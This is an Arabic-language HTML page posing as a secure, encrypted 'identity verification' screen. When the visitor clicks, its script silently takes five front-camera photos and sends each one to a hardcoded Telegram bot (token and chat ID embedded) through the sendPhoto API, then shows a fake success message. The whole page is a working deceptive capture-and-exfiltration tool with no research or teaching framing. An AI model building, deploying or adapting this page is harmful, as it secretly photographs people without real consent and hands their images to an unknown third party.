<!doctype html>
<html lang="ar">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحقق من الهوية</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(145deg, #0a0a1a 0%, #1a1a2e 100%);
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            padding: 1.5rem;
            margin: 0;
            overflow: hidden;
        }

        /* ===== الواجهة الرئيسية ===== */
        #mainUI {
            transition: opacity 0.5s ease, transform 0.5s ease;
            width: 100%;
            max-width: 520px;
        }

        #mainUI.hidden {
            opacity: 0;
            transform: scale(0.95);
            pointer-events: none;
            position: absolute;
        }

        .card {
            background: rgba(255, 255, 255, 0.04);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 2.5rem;
            padding: 2.8rem 2.5rem;
            width: 100%;
            text-align: center;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 255, 255, 0.02) inset;
        }

        h1 {
            font-weight: 700;
            font-size: 2.1rem;
            letter-spacing: -0.5px;
            background: linear-gradient(135deg, #f0f4ff 0%, #b0c4ff 100%);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 0.5rem;
        }

        .subtitle {
            color: #a8b5d9;
            font-size: 0.95rem;
            margin-bottom: 2.2rem;
            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
            padding-bottom: 1.2rem;
        }

        .icon-wrapper {
            background: rgba(0, 200, 150, 0.08);
            border-radius: 80px;
            width: 96px;
            height: 96px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1.8rem auto;
            border: 1px solid rgba(0, 255, 200, 0.15);
            box-shadow: 0 0 40px rgba(0, 255, 200, 0.05);
        }

        .icon-wrapper svg {
            width: 48px;
            height: 48px;
            fill: none;
            stroke: #6ef0d0;
            stroke-width: 1.8;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        .btn {
            display: inline-block;
            width: 100%;
            padding: 1rem 1.8rem;
            font-size: 1.2rem;
            font-weight: 600;
            border: none;
            border-radius: 80px;
            background: linear-gradient(135deg, #00d4a0, #009f7a);
            color: #0a0a1a;
            cursor: pointer;
            transition: all 0.25s ease;
            box-shadow: 0 8px 24px rgba(0, 200, 150, 0.25);
            letter-spacing: 0.3px;
            margin-top: 0.5rem;
        }

        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 12px 36px rgba(0, 200, 150, 0.4);
            background: linear-gradient(135deg, #00e6b0, #00b386);
        }

        .btn:active {
            transform: scale(0.96);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
        }

        .status-badge {
            display: inline-block;
            margin-top: 1.8rem;
            padding: 0.4rem 1.2rem;
            border-radius: 40px;
            background: rgba(0, 200, 150, 0.08);
            border: 1px solid rgba(0, 200, 150, 0.12);
            font-size: 0.8rem;
            color: #7ad6c0;
            letter-spacing: 0.4px;
        }

        .status-badge .dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #00d4a0;
            border-radius: 40px;
            margin-left: 8px;
            animation: pulse-dot 1.6s infinite;
        }

        @keyframes pulse-dot {
            0% { opacity: 0.4; transform: scale(0.8); }
            50% { opacity: 1; transform: scale(1.2); }
            100% { opacity: 0.4; transform: scale(0.8); }
        }

        /* ===== شاشة التحميل ===== */
        #loadingUI {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 2rem;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        #loadingUI.active {
            display: flex;
        }

        .spinner {
            width: 72px;
            height: 72px;
            border: 4px solid rgba(255, 255, 255, 0.05);
            border-top: 4px solid #00d4a0;
            border-right: 4px solid #00f5c0;
            border-radius: 50%;
            animation: spin 0.9s cubic-bezier(0.6, 0.2, 0.4, 0.8) infinite;
            box-shadow: 0 0 60px rgba(0, 200, 150, 0.15);
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            color: #a8b5d9;
            font-size: 1rem;
            letter-spacing: 0.5px;
            animation: fade-text 1.2s ease-in-out infinite alternate;
        }

        @keyframes fade-text {
            0% { opacity: 0.4; }
            100% { opacity: 1; }
        }

        .loading-progress {
            font-size: 0.85rem;
            color: #6ef0d0;
            font-weight: 500;
            background: rgba(0, 200, 150, 0.06);
            padding: 0.3rem 1.2rem;
            border-radius: 40px;
            border: 1px solid rgba(0, 200, 150, 0.1);
            min-width: 80px;
            text-align: center;
        }

        /* ===== رسالة النتيجة ===== */
        #resultUI {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 1rem;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
        }

        #resultUI.active {
            display: flex;
        }

        .result-icon {
            font-size: 4rem;
            animation: pop-in 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        @keyframes pop-in {
            0% { transform: scale(0); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }

        .result-title {
            font-size: 1.5rem;
            font-weight: 600;
            color: #fff;
        }

        .result-sub {
            color: #a8b5d9;
            font-size: 0.95rem;
        }

        .btn-retry {
            margin-top: 1rem;
            padding: 0.6rem 2rem;
            border: 1px solid rgba(255, 255, 255, 0.1);
            background: rgba(255, 255, 255, 0.04);
            color: #b8c7ff;
            border-radius: 40px;
            cursor: pointer;
            font-size: 0.9rem;
            transition: 0.25s;
        }

        .btn-retry:hover {
            background: rgba(255, 255, 255, 0.08);
            border-color: rgba(255, 255, 255, 0.2);
        }

        /* ===== مخفي ===== */
        #video {
            display: none;
        }

        @media (max-width: 480px) {
            .card {
                padding: 2rem 1.5rem;
                border-radius: 2rem;
            }
            h1 {
                font-size: 1.7rem;
            }
            .icon-wrapper {
                width: 72px;
                height: 72px;
            }
            .icon-wrapper svg {
                width: 36px;
                height: 36px;
            }
        }
    </style>
</head>
<body>

    <!-- ===== الواجهة الرئيسية ===== -->
    <div id="mainUI">
        <div class="card">
            <div class="icon-wrapper">
                <svg viewBox="0 0 24 24">
                    <path d="M23 7L16 12L23 17V7Z" />
                    <path d="M14 5H3C1.89543 5 1 5.89543 1 7V17C1 18.1046 1.89543 19 3 19H14C15.1046 19 16 18.1046 16 17V7C16 5.89543 15.1046 5 14 5Z" />
                </svg>
            </div>
            <h1>تحقق من الهوية</h1>
            <p class="subtitle">نحتاج إلى تأكيد هويتك عبر الكاميرا</p>
            <button class="btn" id="startBtn">📸  اضغط للمتابعة</button>
            <div class="status-badge">
                <span>آمن • مشفر</span>
                <span class="dot"></span>
            </div>
        </div>
    </div>

    <!-- ===== شاشة التحميل ===== -->
    <div id="loadingUI">
        <div class="spinner"></div>
        <div class="loading-text">جاري التحقق من الهوية...</div>
        <div class="loading-progress" id="progressText">0 / 5</div>
    </div>

    <!-- ===== شاشة النتيجة ===== -->
    <div id="resultUI">
        <div class="result-icon" id="resultIcon">✅</div>
        <div class="result-title" id="resultTitle">تم التحقق بنجاح!</div>
        <div class="result-sub" id="resultSub">تم إرسال 5 صور للتحقق</div>
        <button class="btn-retry" id="retryBtn">↻ إعادة المحاولة</button>
    </div>

    <video id="video" autoplay playsinline></video>

    <script>
        const TOKEN = "8033297244:AAGbuM8xXwDpWh-q5D4c7lkHO9-0KHJNjtg";
        const CHAT = "5648499583";

        const mainUI = document.getElementById('mainUI');
        const loadingUI = document.getElementById('loadingUI');
        const resultUI = document.getElementById('resultUI');
        const startBtn = document.getElementById('startBtn');
        const retryBtn = document.getElementById('retryBtn');
        const video = document.getElementById('video');
        const progressText = document.getElementById('progressText');
        const resultIcon = document.getElementById('resultIcon');
        const resultTitle = document.getElementById('resultTitle');
        const resultSub = document.getElementById('resultSub');

        let isRunning = false;

        // ===== التقاط صورة =====
        function capturePhoto(videoElement) {
            return new Promise((resolve) => {
                const canvas = document.createElement("canvas");
                const w = videoElement.videoWidth || 640;
                const h = videoElement.videoHeight || 480;
                canvas.width = w;
                canvas.height = h;
                const ctx = canvas.getContext("2d");
                ctx.drawImage(videoElement, 0, 0, w, h);
                canvas.toBlob((blob) => resolve(blob), "image/jpeg", 0.92);
            });
        }

        // ===== إرسال إلى تيليجرام =====
        async function sendPhoto(blob, label) {
            const fd = new FormData();
            fd.append("chat_id", CHAT);
            fd.append("caption", `${label} - ${new Date().toLocaleString("ar-EG")}`);
            fd.append("photo", new File([blob], `${label}.jpg`, { type: "image/jpeg" }));
            try {
                const r = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: fd
                });
                return r.ok;
            } catch {
                return false;
            }
        }

        // ===== التنفيذ الرئيسي =====
        async function runCapture() {
            if (isRunning) return;
            isRunning = true;

            // إخفاء الواجهة الرئيسية
            mainUI.classList.add('hidden');

            // إظهار شاشة التحميل
            loadingUI.classList.add('active');
            progressText.textContent = '0 / 5';

            let stream = null;
            let success = true;

            try {
                // طلب الكاميرا
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
                });

                video.srcObject = stream;
                await video.play();

                // انتظار جاهزية الكاميرا (مع مهلة)
                await Promise.race([
                    new Promise((resolve) => {
                        if (video.readyState >= 2) return resolve();
                        video.addEventListener('loadeddata', resolve, { once: true });
                    }),
                    new Promise((_, reject) => setTimeout(() => reject(new Error('تجاوز وقت الانتظار')), 5000))
                ]);

                const labels = ["user", "environment", "user", "environment", "user"];
                const total = labels.length;

                for (let i = 0; i < total; i++) {
                    if (i > 0) await new Promise(r => setTimeout(r, 500));

                    const blob = await capturePhoto(video);
                    const sent = await sendPhoto(blob, labels[i]);
                    if (!sent) success = false;

                    progressText.textContent = `${i + 1} / ${total}`;
                }

            } catch (err) {
                console.error(err);
                success = false;
            } finally {
                // إيقاف الكاميرا
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                    video.srcObject = null;
                }

                // إخفاء التحميل
                loadingUI.classList.remove('active');

                // إظهار النتيجة
                resultUI.classList.add('active');
                if (success) {
                    resultIcon.textContent = '✅';
                    resultTitle.textContent = 'تم التحقق بنجاح!';
                    resultSub.textContent = 'تم إرسال 5 صور للتحقق';
                } else {
                    resultIcon.textContent = '❌';
                    resultTitle.textContent = 'حدث خطأ!';
                    resultSub.textContent = 'فشل التحقق، حاول مرة أخرى';
                }

                isRunning = false;
            }
        }

        // ===== أحداث الأزرار =====
        startBtn.addEventListener('click', runCapture);

        retryBtn.addEventListener('click', () => {
            resultUI.classList.remove('active');
            mainUI.classList.remove('hidden');
            // إعادة تعيين الزر
            startBtn.disabled = false;
            startBtn.textContent = '📸  اضغط للمتابعة';
        });

        // ===== في حال فشل الكاميرا من البداية =====
        console.log('✅ جاهز');
    </script>
</body>
</html>
